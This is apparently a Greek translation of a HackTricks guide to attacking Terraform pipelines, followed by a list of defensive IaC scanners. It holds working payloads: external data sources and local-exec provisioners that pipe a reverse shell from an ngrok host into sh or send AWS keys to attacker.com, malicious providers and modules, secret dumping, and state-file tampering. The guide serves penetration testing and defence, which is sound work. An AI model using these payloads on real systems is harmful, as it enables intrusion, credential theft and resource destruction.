# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Basic Information

[Από τα έγγραφα:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform είναι ένα **εργαλείο υποδομής ως κώδικα** που σας επιτρέπει να ορίζετε τόσο **πόρους cloud όσο και on-prem** σε αρχεία διαμόρφωσης που είναι αναγνώσιμα από ανθρώπους και μπορείτε να εκδόσετε, να επαναχρησιμοποιήσετε και να μοιραστείτε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε μια συνεπή ροή εργασίας για να προμηθεύσετε και να διαχειριστείτε όλη την υποδομή σας καθ' όλη τη διάρκεια του κύκλου ζωής της. Το Terraform μπορεί να διαχειριστεί χαμηλού επιπέδου στοιχεία όπως υπολογιστική ισχύ, αποθήκευση και πόρους δικτύωσης, καθώς και υψηλού επιπέδου στοιχεία όπως καταχωρίσεις DNS και χαρακτηριστικά SaaS.

#### Πώς λειτουργεί το Terraform;

Το Terraform δημιουργεί και διαχειρίζεται πόρους σε πλατφόρμες cloud και άλλες υπηρεσίες μέσω των διεπαφών προγραμματισμού εφαρμογών (APIs) τους. Οι πάροχοι επιτρέπουν στο Terraform να λειτουργεί με σχεδόν οποιαδήποτε πλατφόρμα ή υπηρεσία με προσβάσιμη API.

![](<../images/image (177).png>)

Η HashiCorp και η κοινότητα του Terraform έχουν ήδη γράψει **πάνω από 1700 παρόχους** για να διαχειρίζονται χιλιάδες διαφορετικούς τύπους πόρων και υπηρεσιών, και αυτός ο αριθμός συνεχίζει να αυξάνεται. Μπορείτε να βρείτε όλους τους δημόσια διαθέσιμους παρόχους στο [Terraform Registry](https://registry.terraform.io/), συμπεριλαμβανομένων των Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog και πολλών άλλων.

Η βασική ροή εργασίας του Terraform αποτελείται από τρία στάδια:

- **Γράψτε:** Ορίζετε πόρους, οι οποίοι μπορεί να είναι σε πολλούς παρόχους cloud και υπηρεσίες. Για παράδειγμα, μπορεί να δημιουργήσετε μια διαμόρφωση για να αναπτύξετε μια εφαρμογή σε εικονικές μηχανές σε ένα δίκτυο Virtual Private Cloud (VPC) με ομάδες ασφαλείας και έναν ελεγκτή φορτίου.
- **Σχέδιο:** Το Terraform δημιουργεί ένα σχέδιο εκτέλεσης που περιγράφει την υποδομή που θα δημιουργήσει, θα ενημερώσει ή θα καταστρέψει με βάση την υπάρχουσα υποδομή και τη διαμόρφωσή σας.
- **Εφαρμογή:** Με την έγκριση, το Terraform εκτελεί τις προτεινόμενες ενέργειες με τη σωστή σειρά, σεβόμενο οποιεσδήποτε εξαρτήσεις πόρων. Για παράδειγμα, αν ενημερώσετε τις ιδιότητες ενός VPC και αλλάξετε τον αριθμό των εικονικών μηχανών σε αυτό το VPC, το Terraform θα αναδημιουργήσει το VPC πριν κλιμακώσει τις εικονικές μηχανές.

![](<../images/image (215).png>)

### Terraform Lab

Απλά εγκαταστήστε το terraform στον υπολογιστή σας.

Εδώ έχετε έναν [οδηγό](https://learn.hashicorp.com/tutorials/terraform/install-cli) και εδώ έχετε τον [καλύτερο τρόπο για να κατεβάσετε το terraform](https://www.terraform.io/downloads).

## RCE στο Terraform

Το Terraform **δεν έχει μια πλατφόρμα που να εκθέτει μια ιστοσελίδα ή μια υπηρεσία δικτύου** που μπορούμε να καταγράψουμε, επομένως, ο μόνος τρόπος για να συμβιβαστεί το terraform είναι να **μπορείτε να προσθέσετε/τροποποιήσετε αρχεία διαμόρφωσης terraform**.

Ωστόσο, το terraform είναι ένα **πολύ ευαίσθητο στοιχείο** για να συμβιβαστεί, διότι θα έχει **προνομιακή πρόσβαση** σε διάφορες τοποθεσίες ώστε να λειτουργεί σωστά.

Ο κύριος τρόπος για έναν επιτιθέμενο να μπορέσει να συμβιβάσει το σύστημα όπου εκτελείται το terraform είναι να **συμβιβάσει το αποθετήριο που αποθηκεύει τις διαμορφώσεις terraform**, διότι σε κάποιο σημείο θα **ερμηνευτούν**.

Στην πραγματικότητα, υπάρχουν λύσεις εκεί έξω που **εκτελούν το terraform plan/apply αυτόματα μετά τη δημιουργία ενός PR**, όπως το **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Εάν μπορείτε να συμβιβάσετε ένα αρχείο terraform, υπάρχουν διάφοροι τρόποι που μπορείτε να εκτελέσετε RCE όταν κάποιος εκτελεί `terraform plan` ή `terraform apply`.

### Terraform plan

Το Terraform plan είναι η **πιο χρησιμοποιούμενη εντολή** στο terraform και οι προγραμματιστές/λύσεις που χρησιμοποιούν το terraform την καλούν συνεχώς, οπότε ο **ευκολότερος τρόπος για να αποκτήσετε RCE** είναι να βεβαιωθείτε ότι δηλητηριάζετε ένα αρχείο διαμόρφωσης terraform που θα εκτελεί αυθαίρετες εντολές σε ένα `terraform plan`.

**Χρησιμοποιώντας έναν εξωτερικό πάροχο**

Το Terraform προσφέρει τον [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) που παρέχει έναν τρόπο διεπαφής μεταξύ του Terraform και εξωτερικών προγραμμάτων. Μπορείτε να χρησιμοποιήσετε την πηγή δεδομένων `external` για να εκτελέσετε αυθαίρετο κώδικα κατά τη διάρκεια ενός `plan`.

Η εισαγωγή σε ένα αρχείο διαμόρφωσης terraform κάτι σαν το παρακάτω θα εκτελέσει ένα rev shell κατά την εκτέλεση του `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Χρησιμοποιώντας έναν προσαρμοσμένο πάροχο**

Ένας επιτιθέμενος θα μπορούσε να στείλει έναν [προσαρμοσμένο πάροχο](https://learn.hashicorp.com/tutorials/terraform/provider-setup) στο [Terraform Registry](https://registry.terraform.io/) και στη συνέχεια να τον προσθέσει στον κώδικα Terraform σε ένα feature branch ([παράδειγμα από εδώ](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Ο πάροχος κατεβαίνει στο `init` και θα εκτελέσει τον κακόβουλο κώδικα όταν εκτελείται το `plan`.

Μπορείτε να βρείτε ένα παράδειγμα στο [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Χρησιμοποιώντας μια εξωτερική αναφορά**

Και οι δύο αναφερόμενες επιλογές είναι χρήσιμες αλλά όχι πολύ κρυφές (η δεύτερη είναι πιο κρυφή αλλά πιο περίπλοκη από την πρώτη). Μπορείτε να εκτελέσετε αυτήν την επίθεση ακόμα και με έναν **πιο κρυφό τρόπο**, ακολουθώντας αυτές τις προτάσεις:

- Αντί να προσθέσετε το rev shell απευθείας στο αρχείο terraform, μπορείτε να **φορτώσετε έναν εξωτερικό πόρο** που περιέχει το rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Μπορείτε να βρείτε τον κώδικα rev shell στο [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- Στην εξωτερική πηγή, χρησιμοποιήστε τη δυνατότητα **ref** για να κρύψετε τον **κώδικα terraform rev shell σε ένα branch** μέσα στο repo, κάτι σαν: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Το Terraform apply θα εκτελεστεί για να εφαρμοστούν όλες οι αλλαγές, μπορείτε επίσης να το εκμεταλλευτείτε για να αποκτήσετε RCE εισάγοντας **ένα κακόβουλο αρχείο Terraform με** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Απλώς πρέπει να βεβαιωθείτε ότι κάποιο payload όπως τα παρακάτω καταλήγει στο αρχείο `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ακολουθήστε τις **προτάσεις από την προηγούμενη τεχνική** για να εκτελέσετε αυτήν την επίθεση με **πιο διακριτικό τρόπο χρησιμοποιώντας εξωτερικές αναφορές**.

## Secrets Dumps

Μπορείτε να έχετε **τιμές μυστικών που χρησιμοποιούνται από το terraform να εκτυπώνονται** εκτελώντας `terraform apply` προσθέτοντας στο αρχείο terraform κάτι σαν:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Κατάχρηση Αρχείων Κατάστασης Terraform

Σε περίπτωση που έχετε δικαιώματα εγγραφής στα αρχεία κατάστασης terraform αλλά δεν μπορείτε να αλλάξετε τον κώδικα terraform, [**αυτή η έρευνα**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) προσφέρει μερικές ενδιαφέρουσες επιλογές για να εκμεταλλευτείτε το αρχείο:

### Διαγραφή πόρων <a href="#deleting-resources" id="deleting-resources"></a>

Υπάρχουν 2 τρόποι για να καταστραφούν οι πόροι:

1. **Εισαγωγή ενός πόρου με τυχαίο όνομα στο αρχείο κατάστασης που να δείχνει στον πραγματικό πόρο που πρέπει να καταστραφεί**

Δεδομένου ότι το terraform θα δει ότι ο πόρος δεν θα έπρεπε να υπάρχει, θα τον καταστρέψει (ακολουθώντας το πραγματικό ID του πόρου που υποδεικνύεται). Παράδειγμα από την προηγούμενη σελίδα:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Τροποποιήστε τον πόρο για να διαγραφεί με τρόπο που να μην είναι δυνατή η ενημέρωση (έτσι θα διαγραφεί και θα αναδημιουργηθεί)**

Για μια EC2 instance, η τροποποίηση του τύπου της instance είναι αρκετή για να κάνει το terraform να διαγράψει και να την αναδημιουργήσει.

### RCE

Είναι επίσης δυνατό να [δημιουργήσετε έναν προσαρμοσμένο πάροχο](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) και απλώς να αντικαταστήσετε έναν από τους παρόχους στο αρχείο κατάστασης του terraform με τον κακόβουλο ή να προσθέσετε έναν κενό πόρο με τον κακόβουλο πάροχο. Παράδειγμα από την αρχική έρευνα:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Αντικατάσταση αποκλεισμένου παρόχου

Σε περίπτωση που συναντήσετε μια κατάσταση όπου το `hashicorp/external` έχει αποκλειστεί, μπορείτε να επαναφέρετε τον πάροχο `external` κάνοντας τα εξής. Σημείωση: Χρησιμοποιούμε ένα fork του παρόχου external που δημοσιεύθηκε από το https://registry.terraform.io/providers/nazarewk/external/latest. Μπορείτε επίσης να δημοσιεύσετε το δικό σας fork ή επαναφορά.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Τότε μπορείτε να χρησιμοποιήσετε `external` όπως συνήθως.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Αυτόματοι Εργαλειοθήκες Ελέγχου

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Το Snyk προσφέρει μια ολοκληρωμένη λύση σάρωσης Infrastructure as Code (IaC) που ανιχνεύει ευπάθειες και κακοδιαμορφώσεις σε Terraform, CloudFormation, Kubernetes και άλλες μορφές IaC.

- **Χαρακτηριστικά:**
- Σάρωση σε πραγματικό χρόνο για ευπάθειες ασφαλείας και ζητήματα συμμόρφωσης.
- Ενσωμάτωση με συστήματα ελέγχου εκδόσεων (GitHub, GitLab, Bitbucket).
- Αυτοματοποιημένα αιτήματα επιδιόρθωσης.
- Λεπτομερείς συμβουλές αποκατάστασης.
- **Εγγραφή:** Δημιουργήστε έναν λογαριασμό στο [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** είναι ένα εργαλείο στατικής ανάλυσης κώδικα για υποδομές ως κώδικα (IaC) και επίσης ένα εργαλείο ανάλυσης σύνθεσης λογισμικού (SCA) για εικόνες και πακέτα ανοιχτού κώδικα.

Σαρώσει την υποδομή cloud που παρέχεται χρησιμοποιώντας [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), ή [OpenTofu](https://opentofu.org/) και ανιχνεύει παραβιάσεις ασφάλειας και συμμόρφωσης χρησιμοποιώντας σάρωση βασισμένη σε γραφήματα.

Εκτελεί [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) που είναι μια σάρωση ανοιχτών πακέτων και εικόνων για Κοινές Ευπάθειες και Εκθέσεις (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

Από τα [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` είναι ένα ελαφρύ, επικεντρωμένο στην ασφάλεια και τη συμμόρφωση πλαίσιο δοκιμών κατά του terraform για να επιτρέψει τη δυνατότητα αρνητικής δοκιμής για την υποδομή σας ως κώδικα.

- **συμμόρφωση:** Διασφαλίστε ότι ο υλοποιημένος κώδικας ακολουθεί τα πρότυπα ασφαλείας, τα δικά σας προσαρμοσμένα πρότυπα
- **ανάπτυξη με βάση τη συμπεριφορά:** Έχουμε BDD για σχεδόν τα πάντα, γιατί όχι για IaC;
- **φορητό:** απλά εγκαταστήστε το από το `pip` ή εκτελέστε το μέσω `docker`. Δείτε [Εγκατάσταση](https://terraform-compliance.com/pages/installation/)
- **προ-ανάπτυξη:** επικυρώνει τον κώδικά σας πριν αναπτυχθεί
- **εύκολη ενσωμάτωση:** μπορεί να εκτελείται στη ροή εργασιών σας (ή σε git hooks) για να διασφαλίσει ότι όλες οι αναπτύξεις επικυρώνονται.
- **διαχωρισμός καθηκόντων:** μπορείτε να διατηρήσετε τις δοκιμές σας σε ένα διαφορετικό αποθετήριο όπου μια ξεχωριστή ομάδα είναι υπεύθυνη.

> [!NOTE]
> Δυστυχώς, αν ο κώδικας χρησιμοποιεί κάποιους παρόχους στους οποίους δεν έχετε πρόσβαση, δεν θα μπορείτε να εκτελέσετε το `terraform plan` και να τρέξετε αυτό το εργαλείο.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Από τα [**docs**](https://github.com/aquasecurity/tfsec): το tfsec χρησιμοποιεί στατική ανάλυση του κώδικα terraform σας για να εντοπίσει πιθανές κακοδιαμορφώσεις.

- ☁️ Ελέγχει για κακοδιαμορφώσεις σε όλους τους κύριους (και μερικούς δευτερεύοντες) παρόχους cloud
- ⛔ Εκατοντάδες ενσωματωμένοι κανόνες
- 🪆 Σαρώσεις μονάδων (τοπικών και απομακρυσμένων)
- ➕ Αξιολογεί εκφράσεις HCL καθώς και κυριολεκτικές τιμές
- ↪️ Αξιολογεί συναρτήσεις Terraform π.χ. `concat()`
- 🔗 Αξιολογεί σχέσεις μεταξύ πόρων Terraform
- 🧰 Συμβατό με το Terraform CDK
- 🙅 Εφαρμόζει (και εμπλουτίζει) πολιτικές Rego που ορίζονται από τον χρήστη
- 📃 Υποστηρίζει πολλαπλές μορφές εξόδου: lovely (προεπιλογή), JSON, SARIF, CSV, CheckStyle, JUnit, κείμενο, Gif.
- 🛠️ Ρυθμιζόμενο (μέσω CLI flags και/ή αρχείου ρυθμίσεων)
- ⚡ Πολύ γρήγορο, ικανό να σαρώσει γρήγορα τεράστιες αποθήκες
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Βρείτε ευπάθειες ασφαλείας, ζητήματα συμμόρφωσης και κακώς διαμορφωμένες υποδομές νωρίς στον κύκλο ανάπτυξης της υποδομής σας ως κώδικα με το **KICS** από την Checkmarx.

**KICS** σημαίνει **K**eeping **I**nfrastructure as **C**ode **S**ecure, είναι ανοιχτού κώδικα και είναι απαραίτητο για οποιοδήποτε έργο cloud native.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Από τα [**docs**](https://github.com/tenable/terrascan): Το Terrascan είναι ένας στατικός αναλυτής κώδικα για το Infrastructure as Code. Το Terrascan σας επιτρέπει να:

- Σαρώσετε χωρίς προβλήματα το infrastructure as code για κακές ρυθμίσεις.
- Παρακολουθείτε την παρεχόμενη υποδομή cloud για αλλαγές ρυθμίσεων που εισάγουν απόκλιση στάσης και επιτρέπει την επιστροφή σε μια ασφαλή στάση.
- Ανιχνεύετε ευπάθειες ασφαλείας και παραβιάσεις συμμόρφωσης.
- Μειώνετε τους κινδύνους πριν από την παροχή υποδομής cloud native.
- Προσφέρει ευελιξία για εκτέλεση τοπικά ή ενσωμάτωσης με το CI\CD σας.
```bash
brew install terrascan
```
## Αναφορές

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{{#include ../banners/hacktricks-training.md}}
